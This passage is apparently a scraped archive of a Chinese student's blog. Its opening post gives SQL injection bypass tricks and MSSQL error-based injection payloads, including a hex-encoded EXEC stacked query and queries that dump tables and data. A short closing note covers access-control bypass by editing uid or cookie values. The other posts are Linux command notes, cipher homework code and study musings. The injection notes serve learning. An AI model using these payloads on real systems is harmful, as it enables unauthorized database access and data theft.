括号被过滤order by 大小比较盲注。 逗号被过滤 使用盲注。 使用join语句。 substr(data,1,1)可以换成substr(data from 1 for 1)，limit 0,1 可以换成limit 0 offset 1 。 if被过滤 双写。 采用同义函数、语句代替：case when condition then 1 else 0 end。 参数污染1&amp;inject&#x3D;union&#x2F;*&amp;inject*&#x2F;select&#x2F;*&amp;inject*&#x2F;1&amp;inject&#x3D;2&amp;inject&#x3D;3&amp;inject&#x3D;4 针对MSSQL报错注入?id=1 and @@version&gt;0强制类型转换失败就报错。 convert函数爆数据库版本select convert(int, @@version)使用hackbar的hex编码将上述语句转换成十六进制得到：73656c65637420636f6e7665727428696e742c20404076657273696f6e29。需要在前面加一个0x。然后注入： ?id=1’;dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c20404076657273696f6e29 eXeC(@s)–+ dEcLaRe @s vArChAr(8000): 声明一个局部变量@s,类型为varchar(8000) sEt @s=0x…: 给@s赋值。 eXeC(@s): 调用exec函数执行@s中的内容。 爆当前数据库select convert(int,db_name()) 爆当前用户select convert(int,User_Name()) 爆表 select convert(int,(select top 1 name from abc[数据库名].sys.all_objects where type=’U’ AND is_ms_shipped=0)) select convert(int,(select top 1 name from abc[数据库名].sys.all_objects where type=’U’ AND is_ms_shipped=0 and name not in(‘CMS_ArticleClass’))) 爆字段 select convert(int,(select top 1 COLUMN_NAME from abc[数据库名].information_schema.columns where table_name=’表名’)) select convert(int,(select top 1 COLUMN_NAME from abc[数据库名].information_schema.columns where table_name=’表名’ and column_name not in(‘id’))) 爆数据select convert(int,(select top 1 username from 表名)) 参考链接某些绕过方法可看里面的：https://mp.weixin.qq.com/s/Hor7qN5XPRZuoxpOLQac3g 这个总结可以：https://xz.aliyun.com/t/7169","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入总结","slug":"SQL注入总结","permalink":"https://ggyggy666.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"学Linux的第三天","slug":"学Linux的第三天","date":"2020-03-16T12:34:26.000Z","updated":"2020-03-16T13:07:44.943Z","comments":true,"path":"2020/03/16/学Linux的第三天/","link":"","permalink":"https://ggyggy666.github.io/2020/03/16/%E5%AD%A6Linux%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/","excerpt":"今天是第三天啦。今天学习软件包的管理。","text":"今天是第三天啦。今天学习软件包的管理。 软件包管理管理.deb软件包：dpkg适用于Ubuntu和Debian。 安装软件sudo dpkg --install 完整的软件包名字 或者 sudo dpkg -i 完整的软件包名字安装软件dpkg -l | grep openssh查看已安装的某个软件信息。dpkg -S openssh搜索跟openssh这个软件相关的文件。 卸载软件sudo dpkg --remove opera 或者 sudo dpkg -r opera卸载opera这个软件。-r是–remove的简写。 管理RPM软件包：rpm适用于Red Hat、openSUSE。 安装软件sudo rpm -ivh 完整的软件包名字-i是安装，-v是显示rpm当前正在执行的工作，-h通过一系列的#显示安装进度。 更新软件sudo rpm -Uvh 完整的软件包名字-U更新一个软件。 查看已安装的软件包rpm -q 某个软件包名字查看某个软件的版本信息。rpm -qa | grep xorg如果不记得软件包名字，可以用-a显示已安装的所有软件包，并且使用grep匹配软件包中名字含有xorg的。 卸载软件包sudo rpm -e 某个软件包名字卸载某个软件。sudo rpm -e -vv --test 某个软件包名字–test模拟删除软件过程（并没有真的删除）。-vv输出完整的调试信息。 高级软件包工具：apt apt-get update: 更新apt-get缓存中的软件包信息。 apt-get install: 下载安装软件。 apt-get upgrade: 下载安装已安装的软件的最新版本。 apt-get remove: 卸载某个软件。 apt-get source：下载某个软件的源代码。 apt-get clean: 删除所有已下载的文件。 apt-get -h: 获取apt-get的完整用法。 查询软件包信息：apt-cacheapt-cache search hello搜索带“hello”的软件包。apt-cache depends helloworld搜索“helloworld”软件的所有依赖文件。 从源代码编译软件下载源文件，解压。tar zxvf xxx.tar.gz解压tar.gz文件。tar jxvf xxx.tar.bz2解压tar.bz2文件。./configure --enable-gui配置图形界面。然后可能需要安装gcc等一堆东西，根据报错百度查找方法。make编译。make install安装。 反正我最后是没成功…还是百度吧。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://ggyggy666.github.io/categories/Linux/"}],"tags":[{"name":"学Linux的第三天","slug":"学Linux的第三天","permalink":"https://ggyggy666.github.io/tags/%E5%AD%A6Linux%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/"}],"keywords":[{"name":"Linux","slug":"Linux","permalink":"https://ggyggy666.github.io/categories/Linux/"}]},{"title":"学Linux的第二天","slug":"学Linux的第二天","date":"2020-03-15T11:05:40.000Z","updated":"2020-03-15T12:22:03.719Z","comments":true,"path":"2020/03/15/学Linux的第二天/","link":"","permalink":"https://ggyggy666.github.io/2020/03/15/%E5%AD%A6Linux%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/","excerpt":"最近几天心情不好，导致“第二天”来晚了。","text":"最近几天心情不好，导致“第二天”来晚了。 上次已经学了一点对文件及目录进行操作的shell命令，今天继续。 文件目录管理建立目录：mkdirmkdir test新建一个名字为test的空目录mkdir /gg/test在当前目录的gg目录下新建一个test目录。如果当前目录下并没有gg目录，那么会报错，此时需要使用：mkdir -p /gg/test先新建一个gg目录，再在gg目录下新建一个test目录。 建立一个空文件夹：touchtouch hello新建一个hello文件。如果hello文件已经存在，使用这个命令就相当于更新这个文件的最后一次修改时间，内容不会被替换。 移动：mvmv hello Dekstop移动hello文件到桌面下。如果桌面已经存在hello文件了，使用这个命令后是不会询问我们就直接把桌面的hello文件覆盖了。因此需要使用：mv -i hello Desktop使用-i参数就会询问我们是否覆盖。y:覆盖，n:取消这次文件的移动mv -b hello Desktop-b参数会在hello后面加个，这样hello和hello就能共存了。相当于文件的重命名。 复制：cpcp hello Desktop将hello文件复制到Desktop下，跟移动是一样的命令。同样有-i和-b参数。cp -r test/ Desktop/-r参数将test目录复制到Desktop下。 删除：rmdir、rmrmdir test删除test空目录。注意它只能删除空目录。rm test/*.php删除test目录下的所有以php为后缀名的文件。rm -i hello询问是否删除hello文件。rm hello_bak以_bak结尾的文件是只读文件，不需要使用-i也会询问是否删除它。rm -f hello_bak-f参数对于询问会自动回答yes。rm -r test/-r参数会将test目录以及test目录下的所有文件都删除掉。 改变文件所有权：chown、chgrprwxr-xr-x代表文件权限。3组权限位共9个字符：rwx、r-x、r-x。分别代表：属主、属组和其他人所拥有的权限。r:可读权限、w:可写入权限、x:执行权限。如果某个权限没有，就使用-代替。ls -l可以查看一个文件的属性。ls -ld test/ld参数可以查看一个目录的属性。 chown的用法chown ggy:root hello将hello文件的属主改为ggy,属组改为root。代表这个文件是被root组下的ggy所拥有。如果未更改之前该文件是被root拥有，那么需要在该命令前增加sudo提示权限。chown ggy hello当然也可以只更改属主为ggy。chown :root hello只更改属组为root，注意需要：。chown -R ggy test/将test目录以及该目录下的所有文件的属主都改为ggy。 chgrp的用法chgrp只用来更改属组，而且不需要提供冒号: 。chgrp root hello更改hello文件的属组为root。chgrp -R root test/将test目录以及该目录下的所有文件的属组都改为ggy。 改变文件权限：chmod文件属主：u, 文件属组：g, 其他人：o, 所有人：a。读取：r, 写入：w, 执行：x。chmod u+x hello增加属主(u)的执行权限(x)。chmod a-x hello删除所有人对该文件的执行权限。chmod ug=rw,o=x hello赋予属主和属组读写权限，其他人只读权限。chmod o=u hello其他人的权限和属主的权限一样。 使用八进制表示权限八进制：0-7 -》 000-111 。rwx：x-&gt;1, w-&gt;2, r-&gt;4 。每出现对应的权限字母就加上相应的数字。比如：rwx: 4+2+1=7 。r-x: 4+0+1=5 。–x: 0+0+1=1 。chmod 711 hello三组权限位，因此需要三个数字。711 -&gt; rwx–r–r 。 文件类型使用ls -l查看到的文件属性的第一个字母就是文件类型。 普通文件： - 目录：d 字符设备文件：c 块设备文件：b （使用mknod创建） 本地域套接口：s 有名管道：p 符号链接：l 建立文件间的链接建立软链接ln -s hello babybaby文件须是先前未存在的。相当于是给hello换了个别名baby。他们指向的是同一个文件。但是删除baby文件不会影响到hello文件，删除hello文件两个文件就都没了。 建立硬链接ln hello baby同样baby先前未存在。相当于新建了一个baby文件，baby文件里面的内容就是hello里面的内容。二者是两个独立的文件。但是如果其中一个文件的内容改变了，另一个文件内容也会跟着改变。 输出重定向正常的输出都是直接显示在屏幕上，可以将输出输出到文件中，相当于给文件新增内容。ls &gt; hellols本来是列出该目录下的所有可见的文件，本来是显示在屏幕中的，现在显示在文件hello中了。也就是将其保存在了hello文件中。注意：&gt; 会将原本文件内容覆盖掉。date &gt;&gt; hello将日期保存在hello中。&gt;&gt; 则是在原来文件内容后追加。 输入重定向cat &lt; hello 等于 cat hello将文件里的内容作为输入。效果就是读取文件内容直接显示在屏幕上。cat &lt;&lt; EOF自己输入，直到输入一个EOF为止才停止输入，然后将所有刚才输入的东西显示在屏幕上。cat &lt;&lt; EOF &gt;&gt; hello组合使用。将自己输入的东西存进hello文件中直至输入EOF为止。 管道符|ls | grep a执行两个命令。先执行ls找出该目录下所有文件，然后使用grep a匹配出这些文件名中含有a的文件，再将同时符合这两个条件的文件显示在屏幕上。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://ggyggy666.github.io/categories/Linux/"}],"tags":[{"name":"学Linux的第二天","slug":"学Linux的第二天","permalink":"https://ggyggy666.github.io/tags/%E5%AD%A6Linux%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/"}],"keywords":[{"name":"Linux","slug":"Linux","permalink":"https://ggyggy666.github.io/categories/Linux/"}]},{"title":"Enigma原理及python实现","slug":"Enigma原理及python实现","date":"2020-03-13T11:21:26.000Z","updated":"2020-03-13T12:31:20.643Z","comments":true,"path":"2020/03/13/Enigma原理及python实现/","link":"","permalink":"https://ggyggy666.github.io/2020/03/13/Enigma%E5%8E%9F%E7%90%86%E5%8F%8Apython%E5%AE%9E%E7%8E%B0/","excerpt":"这周的作业是编程实现Enigma加密。","text":"这周的作业是编程实现Enigma加密。 由于上课不听课，加上老师讲得不清不楚的，导致刚看到这题目时我是一脸懵逼的。Enigma到底是啥玩意啊？ 原理 键盘上有26个字母，当按下某个字母比如A时，第一个转子会转一次，导致线路改变，对应的灯泡就会亮起，那个亮的灯泡代表的字母就是加密后得到的字母比如T。因此A就加密成了T。相当于一种代替密码，不过这个复杂得多。 一般Enigma机器会有3个转子，加密之前需要将转子设定好某个固定的位置（0-25数字范围）。比如第一个转子初始位置为5，第二个为16，第三个为0。然后在加密之时，按下了一个字母后，第一个转子会首先转动一转，这时位置就变成了6。其它转子不动，电路接通对应某个灯泡亮起，成功加密一次。持续操作后，如果第一个转子位置到26了，因为没有26，它的位置就变为0了，这时代表转子已经转动一圈了（以0位分界）。那么第二个转子就转动一转，位置就是17了，而第三转子不动。类似地当第二个转子到达0时，第三转子才转动一转，位置为1。其实就是类似时钟。 每个转子上都有数字代表位置，如果将这些位置代表成相应的字母的话，那么转子转动联通不同线路的这个加密过程可以表示为： 可以看到，当按下字母如K时，根据转轮的初始位置判断得到通过第一个转轮的密文是A，然后又考虑上第二个转轮的位置，通过第二个转轮的密文变为T，同理，通过第三个转轮的密文为C，即K-A-T-C。然后在反射器中，C变为了F（之所以叫反射器，是因为F对应的字母是C）。然后再按原路返回，此时输出的是F通过第三转轮，然后F对应O，O对应M，因此最终加密成功得到的密文是M。因此K加密成了M。Enigma特殊之处在于，当输入M时，最终能得到K。相当于按上图逆过程一遍。 Python实现 首先初始化反射器和三个转子。注意：反射器中的下标和值必须两两对应。如：下标为0的值是11，那么下标为11的值必须是0。转子中的数值则没有要求。初始化一个列表用来存储通信密码和明文加密后得到的密文。 主函数中，输入转子个数，并初始化转子的位置。因为需要加密两次，第一次加密通信密码，第二次加密明文。在第一次加密后转子位置会改变，因此需要一个list2来保存加密前的转子初始位置。这样在第二次加密时使用的也是同一个转子位置。 对传入的字符串进行转化成列表形式，然后可以遍历其中每一个字母并传入加密函数crypt中进行加密。 实现加密函数。首先传入一个字母，得到它跟字母a相差的距离大小n。然后开始进行转子的加密。首先这个n会与第一个转子的初始位置相加，为了防止溢出，需要模26。相加后得到的值作为下标去获取转子列表中对应的第一个转子的值。并还是赋值给n，这样循环递归。接着循环第二次，第一个转子得到的值与第二个转子的初始位置相加，作为下标，获取对应的值；最后进行第三次循环，得到的值与第三个转子的初始位置相加，作为下标，获取对应的值。然后是n = reflector[n]这句，获得的值作为reflecttor的下标获取对应的值。然后反过来，得到的这个值经过第三个转轮，它同样是需要先使用index方法获取这个值对应的下标再减去第三转轮的初始位置，得到的值去对比第二个转轮的值，获取它在第二个转轮中的下标，再减去第二个转轮的初始位置，得到一个值。这个值再去对应第一个转轮的值，获取它在第一个转轮中的下标，再减去第一个转轮的初始位置，最后得到的值经过miWen1 = chr(n+ord(&#39;a&#39;))后，得到最终加密后的一个密文字母。并把它存进去miWen列表中。上述实现了一个字母的加密，于是第一个转子需要转动一转，即初始位置加1.判断是否满26了，相应的将第二个转子加1.第三转子同理。以上便是全部实现过程。 结果 通信密码是：ggyggy明文是：isveryhandsome加密后得到的密文是：hfkqlnookogixkcoolqu 按照Enigma原理，在转子的初始位置相同的情况下，将密文加密一遍后可以得到原来的明文。如下： 输入密文的前六位为通信密码：hfkqln。然后将剩下的明文输入，最后得到了原来的明文：ggyggyisveryhandsome。","categories":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"Enigma原理及python实现","slug":"Enigma原理及python实现","permalink":"https://ggyggy666.github.io/tags/Enigma%E5%8E%9F%E7%90%86%E5%8F%8Apython%E5%AE%9E%E7%8E%B0/"}],"keywords":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"学Linux的第一天","slug":"学Linux的第一天","date":"2020-03-11T02:43:42.000Z","updated":"2020-03-11T03:35:29.377Z","comments":true,"path":"2020/03/11/学Linux的第一天/","link":"","permalink":"https://ggyggy666.github.io/2020/03/11/%E5%AD%A6Linux%E7%9A%84%E7%AC%AC%E4%B8%80%E5%A4%A9/","excerpt":"从今天开始学习Linux啦！","text":"从今天开始学习Linux啦！ 只总结使用命令，不总结其它东西。 Shell基本命令转换目录cd /进入根目录 cd home/进入home目录，里面存放着所有用户的主目录 cd 或者 cd ~进入当前用户的主目录 查看文件cat用法cat 文件名查看一个文件 cat 文件名 文件名查看多个文件 cat -n 文件名查看文件时显示行号 more用法more fstabcat会将文件一次性显示出来，more先只显示一部分。空格换页，回车进入下一行。 head和tail用法head -n 2 文件名显示文件开头的两行内容，注意这里-n不是显示行号。tail的用法一样。 less用法less 文件名跟more类似，不会一下子显示出所有内容。文件末尾会有：可以输入/，后面加查找内容，就可以在文件中查找。 查看目录显示当前目录pwd列出目录内容ls的用法ls列出所有目录下的内容，包括目录、可执行文件、链接文件。 ls -F列出目录下的所有内容。目录后加/,可执行文件后加*，链接文件后加@ ls -a将隐藏文件也列出来。 ls -aF两个命令合用。 ls -l 列出文件及文件各种属性。有8个属性，从左到右依次是： 文件权限 文件的链接个数 文件所有者的用户名 用户所在的用户组组名 文件大小 最后一次修改的日期 文件名 dir的用法dir 文件名跟ls一样 vdir 文件名跟ls -l一样 命令行补全补全文件名cat fs 按tab键只有一个以fs开头的文件时，按tab键补全。 cat fs 按两次tab键有两个及以上以fs开头的文件时，按两次tab键补全。 补全命令ca 按tab键有两个及以上以ca开头的命令时，按两次tab键。命令和文件一样。 通配符ls *.cpp找出目录下所有以.cpp结尾的文件 ls test?找出以test开头后面跟一个字符的文件，如test1,testa ls test[1-3] 或 ls test[A-Z]找出test1、test2、test3文件。[]里面的是可选择的，只要满足都会显示出来。 查找文件内容grep ab 文件名在某个文件中查找ab 查找文件find的用法find 目录名 -name zip -print在文件下查找文件名为zip的文件 find 目录名 -name init.d -type d -print在目录下查找名字为init.d的目录。类型d就是指定查找目录。f就是指定查找普通文件 find 目录名 -type f -atime +100 -print查找该目录下100天内都没有修改过的所有文件，+就是指大于等于100天，atime是没有修改 find 目录名 -type f -mtime -1 -print查找该目录下最近一天内修改过的所有文件，-就是指小于等于1天。mtime是修改过了。 locate的用法locate *.doc瞬间查找出所有以doc结尾的文件。locate命令自动建立了整个文件名数据库，可以快速查找出来。 查找特定程序命令即文件。 whereis find查找出find命令所在目录 whereis -b find查找出find命令的二进制可执行 文件。 用户及版本信息查看who 查看所有用户名 whoami查看正在工作的用户名。 uname -a查看系统的所有版本信息。 uname -r查看系统的内核信息。 寻求帮助-manman find忘记了find的使用方法，可以用这个查看。 获取命令简介whatis的使用whatis uname打印出uname的简单介绍：查看系统的版本信息 apropos的使用apropos search对于一个功能如搜索功能，有很多个命令，忘记了应该用哪个，就用apropos进行反查。可以得到跟搜索有关的各个命令及使用简介。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://ggyggy666.github.io/categories/Linux/"}],"tags":[{"name":"学Linux的第一天","slug":"学Linux的第一天","permalink":"https://ggyggy666.github.io/tags/%E5%AD%A6Linux%E7%9A%84%E7%AC%AC%E4%B8%80%E5%A4%A9/"}],"keywords":[{"name":"Linux","slug":"Linux","permalink":"https://ggyggy666.github.io/categories/Linux/"}]},{"title":"古典密码之替换——仿射密码","slug":"古典密码之替换——仿射密码","date":"2020-03-06T12:26:01.000Z","updated":"2020-03-06T12:57:42.327Z","comments":true,"path":"2020/03/06/古典密码之替换——仿射密码/","link":"","permalink":"https://ggyggy666.github.io/2020/03/06/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B9%8B%E6%9B%BF%E6%8D%A2%E2%80%94%E2%80%94%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/","excerpt":"今天完成了密码学的编程部分作业-使用仿射密码方式将明文加密。","text":"今天完成了密码学的编程部分作业-使用仿射密码方式将明文加密。 所谓仿射密码，其实就是将明文的每一个字母通过e=ax+b(mod 26）的运算加密成另一个字母。由于加密前是字母，加密后也是字母，就相当于一个字母替换了原有字母。这就是古典密码。 代码使用python写的，很简洁。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import random, math#初始化各个值num &#x3D; [3, 5, 7, 9, 11, 15, 17, 19, 21, 23,25] #26以内的质数ch &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, \\ &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39; ] #26个字母组成的一个列表dict1 &#x3D; &#123; &#39;a&#39;: 0, &#39;b&#39;: 0, &#39;c&#39;: 0, &#39;d&#39;: 0, &#39;e&#39;: 0, &#39;f&#39;: 0, &#39;g&#39;: 0, &#39;h&#39;: 0, &#39;i&#39;: 0, &#39;j&#39;: 0, &#39;k&#39;: 0, &#39;l&#39;: 0, &#39;m&#39;: 0, \\ &#39;n&#39;: 0, &#39;o&#39;: 0, &#39;p&#39;: 0, &#39;q&#39;: 0, &#39;r&#39;: 0, &#39;s&#39;: 0, &#39;t&#39;: 0, &#39;u&#39;: 0, &#39;v&#39;: 0, &#39;w&#39;: 0, &#39;x&#39;: 0, &#39;y&#39;: 0, &#39;z&#39;: 0 &#125; #26个字母组成的一个字典。0表示这个字母出现的频率n &#x3D; 0a, b, c &#x3D; 0, 0, 0mingWen &#x3D; input(&quot;请输入明文：&quot;) #输入明文with open(&quot;crypt.txt&quot;, &#39;a&#39;) as f: f.write(&quot;明文：&quot; + mingWen + &quot;\\n&quot;) #将明文写入一个文件list1 &#x3D; list(mingWen) #将明文字符串转为一个列表，方便后面遍历length &#x3D; len(list1) #明文长度#开始加密循环while(n&lt;20): list2 &#x3D; [] #定义一个空列表，用来存取密文 dict &#x3D; &#123; &#39;a&#39;: 0, &#39;b&#39;: 0, &#39;c&#39;: 0, &#39;d&#39;: 0, &#39;e&#39;: 0, &#39;f&#39;: 0, &#39;g&#39;: 0, &#39;h&#39;: 0, &#39;i&#39;: 0, &#39;j&#39;: 0, &#39;k&#39;: 0, &#39;l&#39;: 0, &#39;m&#39;: 0, \\ &#39;n&#39;: 0, &#39;o&#39;: 0, &#39;p&#39;: 0, &#39;q&#39;: 0, &#39;r&#39;: 0, &#39;s&#39;: 0, &#39;t&#39;: 0, &#39;u&#39;: 0, &#39;v&#39;: 0, &#39;w&#39;: 0, &#39;x&#39;: 0, &#39;y&#39;: 0, &#39;z&#39;: 0 &#125; #定义一个字典，这里的0表示该字母出现的次数 #加密运算 for x in list1: #遍历明文，将明文中的每一个字母进行加密 randomNum2 &#x3D; random.randint(0, 10) #随机产生一个范围在0-10内的整数 randomNum1 &#x3D; random.randint(0, 25) #随机产生一个范围在0-25内的整数 y &#x3D; ch.index(x) #找到明文中的每一个字母对应上面的26个字母的列表中的下标 location &#x3D; (num[randomNum2]*y + randomNum1) % 26 #使用 e&#x3D;ax+b(mod 26)公式计算 list2.append(ch[location]) #将计算出的值作为下标找到26个字母表中对应的字母作为加密后的密文字符，存进list2 for k, v in dict.items(): if k &#x3D;&#x3D; ch[location]: v +&#x3D; 1 #在字典中找到跟加密后得到的字符一样的键，然后将它的值加一，代表这个字母又出现了一次。 dict[k] &#x3D; v #将密文及每个密文字母出现的频率输出到文件中 with open(&quot;crypt.txt&quot;, &#39;a&#39;) as f: f.write(&quot;\\n&quot; + &quot;密文：&quot; + &#39;&#39;.join(list2) + &quot;\\n&quot;) #输出密文字符串 for k, v in dict.items(): w &#x3D; round((v&#x2F;length)*100, 2) #计算这一次加密过程中某个字母出现的频率 dict[k] &#x3D; w m &#x3D; round((w + dict1[k])&#x2F;2, 2) #累计这100次加密过程中每个字母出现的频率，并求平均值 dict1[k] &#x3D; m #保存到字典dict1中 if v !&#x3D; 0: f.write(k + &quot;: &quot; + str(w) + &quot;% &quot;) #将此次加密过程得到的密文字母及对应的出现频率输出到文件中。 n &#x3D; n+1#将dict1中的代表这100次加密过程得到的最终的每个字母出现频率输出到文件with open(&quot;crypt.txt&quot;, &#39;a&#39;) as f: f.write(&quot;\\n\\n&quot; + &quot;最终每个字母出现的频率为：\\n&quot; + str(dict1)) 效果 我将加密后的密文、密文中出现的字母所占频率以及最终经过20次加密后得到的每个字母出现频率的平均值都输出来了。","categories":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"古典密码之替换——仿射密码","slug":"古典密码之替换——仿射密码","permalink":"https://ggyggy666.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B9%8B%E6%9B%BF%E6%8D%A2%E2%80%94%E2%80%94%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/"}],"keywords":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"关于面向过程和面向对象的思考","slug":"关于面向过程和面向对象的思考","date":"2020-03-05T12:05:02.000Z","updated":"2020-03-05T13:32:04.677Z","comments":true,"path":"2020/03/05/关于面向过程和面向对象的思考/","link":"","permalink":"https://ggyggy666.github.io/2020/03/05/%E5%85%B3%E4%BA%8E%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%80%9D%E8%80%83/","excerpt":"个人学习了几门语言，起初以为对面向过程和面向对象还算是了解，越深究就越发现以前的理解还是挺粗浅的，经不起考验。","text":"个人学习了几门语言，起初以为对面向过程和面向对象还算是了解，越深究就越发现以前的理解还是挺粗浅的，经不起考验。 众所周知，阿基米德在洗澡时发现了水的浮力，我呢，虽不及这一伟人，但也算是小有收获吧。哈哈哈。 面向过程顾名思义，面向过程就是我们在写程序时，按照所需要的步骤来一步步地写，从而让编程软件按照代码来一步步地编译执行。这也非常符合我们人类的正常思维。就像是写一道数学题嘛，你得一步步的去证明它，逻辑严密，有理有据，才能让人信服。 面向对象你以为的面向对象编程是这样子的吗： 哈哈，想P吃呢。所谓面向对象，就是在解决一个问题时，将这个问题中设计到的东西封装成一个个对象，这个对象中存在着属性和方法。然后通过将这个对象进行实例化去调用类里面的属性和方法。举个例子： 观察一下与面向过程的不同。它将一个问题：动物进食分解成了几个对象。涉及到的动物有三个，于是将它们一个个封装起来。然后这些封装之后的对象中又存在有方法（方法就是类里面的函数），比如猫中有输出吃鱼的方法，而老鼠就是输出吃大米的方法。很明显，与c语言一条道走到黑不同，c++等面向对象语言分成了几条道，在需要时就调用里面的方法，不需要它就可以把它晾着。但其实仔细观察可以发现这个面向对象中也包含有了面向过程的思想。有三条道，那么每一条道不就是面向过程了吗？比如第一条，解决动物进食问题，那么就实例化猫这个对象，然后再调用猫里面的吃鱼方法，进而输出。问题来了：既然这个面向对象中又混杂有面向过程，我凭什么就要叫它面向对象呢？ 得出结论经过本人（绞尽脑汁，费尽心机）的思考，得出了一点结论。面向对象和面向过程的实质其实都是面向过程，之所以有这个区分只是对于人而言为了让人更好的理解而已，但最终都应是对于机器而言的。代码交给编程软件进行编译运行，对于机器来说，这个过程还是得一步步的进行，因此本质还是面向过程。","categories":[],"tags":[{"name":"关于面向过程和面向对象的思考","slug":"关于面向过程和面向对象的思考","permalink":"https://ggyggy666.github.io/tags/%E5%85%B3%E4%BA%8E%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%80%9D%E8%80%83/"}],"keywords":[]},{"title":"拉丁方阵","slug":"拉丁方阵","date":"2020-03-03T11:02:47.000Z","updated":"2020-03-03T11:31:25.501Z","comments":true,"path":"2020/03/03/拉丁方阵/","link":"","permalink":"https://ggyggy666.github.io/2020/03/03/%E6%8B%89%E4%B8%81%E6%96%B9%E9%98%B5/","excerpt":"今天上密码学，老师PPT里提到了拉丁方阵，但是老师却什么都没讲，于是就自己了解了一下。","text":"今天上密码学，老师PPT里提到了拉丁方阵，但是老师却什么都没讲，于是就自己了解了一下。 定义所谓拉丁方阵，其实就是一个n阶矩阵，矩阵里只含有n种元素，并且每一行和每一列该元素都只出现一次。数独就是一个典型的例子。 标准型拉丁方阵第一行和第一列是将n种元素按照从小到大的顺序排列的。具体例子看下面的。 构造一个拉丁方阵方法有多种，最简单的一种就是根据标准拉丁方阵来构造。代码如下： 12345678910111213#include&lt;stdio.h&gt;int main()&#123; int n&#x3D;6, i, j, k, t; for(i&#x3D;0;i&lt;n;i++)&#123; for(j&#x3D;0;j&lt;n;j++)&#123; t &#x3D; (i+j)%n+1; printf(&quot;%d &quot;,t); &#125; printf(&quot;\\n&quot;); &#125; return 0;&#125; 使用两层循环。外层循环控制每一行，内层循环控制每一列。举个例子，当i=0时，为第一行，进入内层循环，j从0到5，那么就可以遍历生成第一行。而第一行的生成使用了模的运算，试着运算一下，会发现就是：1 2 3 4 5 6。然后进入i=1，同理生成：2 3 4 5 6 1。……最终结果如下： 看，是不是每一行和每一列就都是每个数字只出现一次了。而且第一行和第一列都是按照从小到大的顺序排列的，因此这就是标准型拉丁方阵。 正交拉丁方阵正交拉丁方阵就是两个阶数相同的拉丁方阵组合在一起之后还是一个拉丁方阵。看例子就能明白了。 同样是每个组合后的元素在每一行和每一行都只出现一次。","categories":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"拉丁方阵","slug":"拉丁方阵","permalink":"https://ggyggy666.github.io/tags/%E6%8B%89%E4%B8%81%E6%96%B9%E9%98%B5/"}],"keywords":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"最后的总结-越权访问、OAuth2.0和在线支付安全","slug":"最后的总结-越权访问、OAuth2-0和在线支付安全","date":"2020-03-01T11:32:31.000Z","updated":"2020-03-01T12:31:56.863Z","comments":true,"path":"2020/03/01/最后的总结-越权访问、OAuth2-0和在线支付安全/","link":"","permalink":"https://ggyggy666.github.io/2020/03/01/%E6%9C%80%E5%90%8E%E7%9A%84%E6%80%BB%E7%BB%93-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%81OAuth2-0%E5%92%8C%E5%9C%A8%E7%BA%BF%E6%94%AF%E4%BB%98%E5%AE%89%E5%85%A8/","excerpt":"","text":"今天是最后一章啦，就合在一块总结完了。 今天不是很开心。不知道是不是因为今天是3月1号，网络规范开始执行了的原因，一大早发现自己的博客的图片链接全挂了。去图床的历史记录还能看到那些图片，但打开链接就直接502了。于是乎，我傻傻的又去找了个免费图床。然后在之前的图床的历史记录中一张张的截图再上传到新的图床中，再将博客里的图片链接全部替换掉。这真的是个大工程，麻烦。最要紧的是，等我全部都替换好后，原先那个图床的图片又能访问了，我可去nm的。一看URL，发现是换了个阿里云的CDN。我服了，白忙活一早上，真是浪费生命。气！ 越权访问安全平行越权 修改某个参数比如uid，遍历 纵向越权 修改cookie中表明用户身份的参数为admin 